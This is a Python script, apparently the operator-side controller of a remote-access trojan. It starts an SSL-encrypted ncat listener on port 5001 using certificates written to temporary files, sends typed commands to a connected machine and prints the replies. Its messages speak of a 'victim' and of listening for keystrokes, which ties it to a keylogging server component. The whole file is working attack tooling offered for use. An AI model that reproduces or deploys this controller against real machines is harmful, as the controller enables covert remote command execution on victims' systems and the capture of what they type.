import subprocess
import tempfile
import threading
from colorama import Fore
import colorama
import certs

#
# Autor   ->  an0mal1a
# Name    ->  Pablo
# GitHub  ->  https://github.com/an0mal1a
# Correo  -> pablodiez024@proton.me
#

# Crear archivo temporal del certificado
cert = tempfile.NamedTemporaryFile(delete=False)
cert.write(certs.get_crte().encode())
cert.close()

# Crear archivo temporal de la clave
key = tempfile.NamedTemporaryFile(delete=False)
key.write(certs.get_locker().encode())
key.close()

colorama.init()

# Proceso principal
ncat = subprocess.Popen(['ncat', '-nvl', '5001', '--ssl-cert', cert.name, '--ssl-key', key.name], stdout=subprocess.PIPE,
            stdin=subprocess.PIPE)


# Enviar comandos
def snd_nc():
    try:
        while True:
            command = input(Fore.RED + " " + Fore.RESET)
            if command:
                # Comando para terminar la conexion
                if command == "terminate" or command == "exit":
                    print(Fore.RED + "\n[!] Cerrando conexión por comandos...\n" + Fore.RESET)
                    ncat.stdin.write("exit".encode() + "\n".encode())
                    ncat.stdin.flush()
                    ncat.communicate()

                    # Si se ha ejecutado server.py, avisar que sigue en escucha
                    if __name__ != "__main__":
                        print(Fore.YELLOW + "\n\t[*] Escuchando keystrokes..." + Fore.RESET)

                    break

                else:
                    # Enviar el comando
                    ncat.stdin.write(command.encode() + "\n".encode())
                    ncat.stdin.flush()

            elif "NCAT DEBUG".encode() in ncat.stdout.read():
                print(Fore.RED + "\nConexion closed by victim" + Fore.RESET)
                exit()
        return "terminate"

    except UnicodeDecodeError:
        print(Fore.RED + "\n\n[!] Exiting session..." + Fore.RESET)
        exit()


def recv_nc():
    encodings = ["utf-8", "latin-1", "ascii"]  # Lista de codificaciones a probar
    try:
        for line in ncat.stdout:
            for encoding in encodings:
                try:
                    decoded_line = line.rstrip().decode(encoding)
                    print(decoded_line)
                    break
                except UnicodeDecodeError:
                    continue
            else:
                # Si ninguna codificación funciona, utilizar una codificación por defecto o ignorar el error
                decoded_line = line.rstrip().decode(errors="ignore")
                print(decoded_line)

    except ValueError:
        pass


def main():
    try:
        read = threading.Thread(target=recv_nc)
        read.start()

        send = threading.Thread(target=snd_nc)
        send.start()

        send.join()
        read.join()
    except KeyboardInterrupt:
        print(Fore.RED + "\n\n[!] Exiting session..." + Fore.RESET)
        exit()


def start():
    try:
        main_thread = threading.Thread(target=main)
        main_thread.start()
        main_thread.join()
    except KeyboardInterrupt:
        exit()


if __name__ == "__main__":
    start()
